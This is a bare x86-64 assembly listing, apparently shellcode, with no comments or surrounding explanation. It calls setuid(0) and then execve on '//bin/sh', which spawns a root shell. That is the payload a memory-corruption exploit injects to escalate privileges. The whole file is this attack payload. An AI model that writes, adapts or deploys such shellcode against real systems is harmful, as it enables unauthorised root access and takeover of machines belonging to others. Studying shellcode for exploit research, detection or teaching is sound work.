    .section .text
    .globl _start

_start:
    endbr64
    xor %rbx, %rbx
    mov %rbx, %rdi
    mov $105, %al
    syscall

    push %rbx
    mov $0x68732f6e69622f2f, %rbx
    push %rbx
    mov %rsp, %rdi
    xor %rsi, %rsi
    mov $59, %al
    cdq
    syscall
